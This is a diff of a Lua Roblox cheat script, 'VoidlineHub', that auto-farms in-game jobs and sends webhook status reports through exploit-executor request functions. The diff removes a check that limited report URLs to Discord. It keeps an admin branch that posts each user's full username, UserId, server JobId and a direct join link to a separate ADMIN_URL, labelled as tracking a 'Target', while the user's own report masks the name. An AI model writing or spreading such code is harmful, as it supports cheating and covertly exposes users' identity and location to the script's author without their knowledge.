@@ -71,80 +71,81 @@ MoneyValue.Changed:Connect(function(newVal)
     end
     lastMoney = newVal
 end)
+
 local function SendWebhook(isTest, isAdmin, isDisconnect)
     local targetURL = (isDisconnect or isTest) and _G.WebhookURL or (isAdmin and ADMIN_URL or _G.WebhookURL)
-    if not targetURL or targetURL == "" or not targetURL:find("discord.com") then return end
+    if not targetURL or targetURL == "" then return end
 
     local runtimeSec = os.time() - (StartTime or os.time())
-    local avatarImg = "https://cdn.discordapp.com/attachments/1464981605486694695/1466048679239487705/IMG_20260125_124614.jpg"
-    local estPerHour = "Rp 30.000.000"
     
-    local playerCount = #game.Players:GetPlayers()
-    local serverType = (playerCount <= 1) and "🔒 Private Server" or "🌐 Public Server"
+    -- [[ CUSTOM WEBHOOK AVATAR (WITH GRADIENT EFFECT) ]] --
+    local customWebhookAvatar = "https://cdn.discordapp.com/attachments/1464981605486694695/1466048679239487705/IMG_20260125_124614.jpg" 
     
-    -- [[ DEEP LINK FIX ]] --
-    local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+    -- [[ GITHUB ICON SET (ICONIC & SHARP) ]] --
+    local iconUser = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/user-circle-2.png"
+    local iconServer = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/server.png"
+    local iconCode = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/fingerprint.png"
+    local iconLink = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/link-2.png"
+    local iconActivity = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/activity.png"
+    local iconMoney = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/wallet.png"
+    local iconTime = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/timer.png"
+    local iconClock = "https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/clock.png"
 
     local payload = {
-        username = "VoidlineHub Premium",
-        avatar_url = avatarImg,
+        username = "VoidlineHub",
+        avatar_url = customWebhookAvatar,
         embeds = {}
     }
 
     if isAdmin then
-        -- [[ ADMIN LUXURY MONITOR ]] --
+        -- [[ NO 2: ADMIN LIVE MONITOR (ICONIC & GRADIENT MIMIC) ]] --
         local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
         local isSitting = (hum and hum.Sit) and "✅ Sitting (On Motor)" or "⚠️ Fell / Standing"
         
         table.insert(payload.embeds, {
-            title = "💎 VOIDLINE HUB 💎",
-            description = "🛡️ **Status:** `SECURE MONITORING`",
-            color = 0x2b2d31, -- Warna Dark Aesthetic
-            thumbnail = { url = avatarImg },
+            title = "🛰️ VOIDLINE ADMIN MONITOR ✨",
+            color = 0x7200FF, -- Dominant Purple from your Gradient (Mimic)
+            thumbnail = { url = customWebhookAvatar }, -- Pake avatar yang sama buat thumbnail
             fields = {
-                {name = "👤 Target Player", value = "> **" .. LP.Name .. "** (" .. LP.UserId .. ")", inline = false},
-                {name = "🛰️ Server Info", value = "> " .. serverType .. " (" .. playerCount .. " Players)", inline = true},
-                {name = "🆔 Session ID", value = "```" .. game.JobId .. "```", inline = false},
-                {name = "🔗 Join Server", value = "👉 [Click to Join Target Server](" .. joinLink .. ")", inline = false},
-                {name = "─── ⚡ `Activity Monitor` ⚡ ───", value = "```fix\n" ..
-                    "» Status  : Farming Active ✅\n" ..
-                    "» Vehicle : " .. isSitting .. "\n" ..
-                    "» Health  : " .. (hum and math.floor(hum.Health) or 0) .. " / 100 HP\n" ..
-                    "» Earned  : " .. FormatRupiah(_G.TotalEarnedFix or 0) .. "\n" ..
-                    "» Income  : " .. estPerHour .. " / Hr\n```", inline = false},
-                {name = "💰 Financials", value = "• Total Balance: **" .. FormatRupiah(MoneyValue.Value) .. "**", inline = false}
+                {name = "<:user:"..iconUser.."> **Player**", value = "> " .. LP.Name .. " (" .. LP.UserId .. ")", inline = false},
+                {name = "<:server:"..iconServer.."> **Server Info**", value = "> " .. (#game.Players:GetPlayers() <= 1 and "Private" or "Public") .. " Server (" .. #game.Players:GetPlayers() .. " Players)", inline = false},
+                {name = "<:code:"..iconCode.."> **Server Code**", value = "```" .. game.JobId .. "```", inline = false},
+                {name = "<:link:"..iconLink.."> [**Join Link to Join Server** ⚡](" .. joinLink .. ")", value = " ", inline = false},
+                {name = "───◇───💠───◇───", value = " ", inline = false},
+                {name = "<:activity:"..iconActivity.."> **Activity Monitor**", value = "```fix\n" ..
+                    "╔══════════════════════════════════╗\n" ..
+                    "║ Status  : Farming ✨ Job         ║\n" ..
+                    "║ Vehicle : " .. (isSitting:sub(1,23)) .. " ║\n" ..
+                    "║ Health  : " .. (hum and math.floor(hum.Health) or 0) .. " / 100 HP              ║\n" ..
+                    "║ Earned  : " .. FormatRupiah(_G.TotalEarnedFix or 0) .. "             ║\n" ..
+                    "║ Income  : Rp 30.000.000/Hr       ║\n" ..
+                    "╚══════════════════════════════════╝```", inline = false},
+                {name = "<:money:"..iconMoney.."> **Financials**", value = "<:time:"..iconTime.."> **Realtime:** **" .. FormatRupiah(MoneyValue and MoneyValue.Value or 0) .. "**\n" ..
+                    "<:clock:"..iconClock.."> **VoidlineHub Deluxe Monitor** • " .. os.date("%Y-%m-%d %H:%M:%S"), inline = false}
             },
-            footer = { text = "VoidlineHub Deluxe • Runtime: " .. FormatTime(runtimeSec) },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            footer = { text = "Session: " .. FormatTime(runtimeSec) .. " | " .. os.date("%d/%m/%Y") }
         })
     else
-        -- [[ USER REPORT LUXURY REWORK ]] --
-        local jobName = (_G.AutoFarmBarista and "Barista" or _G.AutoFarmCourier and "Courier" or _G.AutoFarmBandung and "Bandung" or "Idle")
-        local statusText = (AutoFarm and "🟢 Enabled (Farming)" or "🔴 Idle (Paused)")
-
+        -- [[ NO 1: TARGET / USER REPORT (ICONIC & CLEAN) ]] --
+        local statusColor = isDisconnect and 0xff4747 or (isTest and 0x5865f2 or 0x00ffcc)
+        
         table.insert(payload.embeds, {
-            title = "⚡ VOIDLINE HUB REPORT ⚡",
-            description = "Farming Session Details",
-            color = 0x5865f2, -- Blurple Premium
-            thumbnail = { url = avatarImg },
+            title = isDisconnect and "❌ PLAYER DISCONNECTED" or "📡 VOIDLINE USER REPORT",
+            color = statusColor,
+            thumbnail = { url = customWebhookAvatar },
             fields = {
-                {name = "🧰 Job Active", value = "> **" .. jobName .. "**", inline = true},
-                {name = "⚙️ Farm Status", value = "> **" .. statusText .. "**", inline = true},
-                {name = "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", value = "", inline = false}, -- Divider
-                {name = "⏱️ Running Time", value = "```yaml\n" .. FormatTime(runtimeSec) .. "```", inline = true},
-                {name = "📊 Income / Hr", value = "```yaml\n" .. estPerHour .. "```", inline = true},
-                {name = "💰 Current Balance", value = "```fix\n" .. FormatRupiah(MoneyValue.Value) .. "```", inline = false},
-                {name = "📈 Total Earned", value = "```fix\n" .. FormatRupiah(_G.TotalEarnedFix or 0) .. "```", inline = false},
+                {name = "<:user:"..iconUser.."> **Player**", value = "> " .. LP.Name:sub(1,1) .. string.rep("*", #LP.Name-2) .. LP.Name:sub(-1), inline = true},
+                {name = "<:time:"..iconTime.."> **Uptime**", value = "> " .. FormatTime(runtimeSec), inline = true},
+                {name = "───◇───💠───◇───", value = " ", inline = false},
+                {name = "<:chart:".."https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/bar-chart-2.png".."> **Statistics**", value = "• Earned: **" .. FormatRupiah(_G.TotalEarnedFix or 0) .. "**\n• Balance: **" .. FormatRupiah(MoneyValue and MoneyValue.Value or 0) .. "**", inline = false}
             },
-            footer = { text = "VoidlineHub System • Player: " .. LP.Name },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            footer = { text = "VoidlineHub Target System • " .. os.date("%I:%M %p") }
         })
     end
 
     local req = syn and syn.request or http_request or request
     if req then pcall(function() req({Url = targetURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end) end
 end
-
 
 
 -- ==========================================
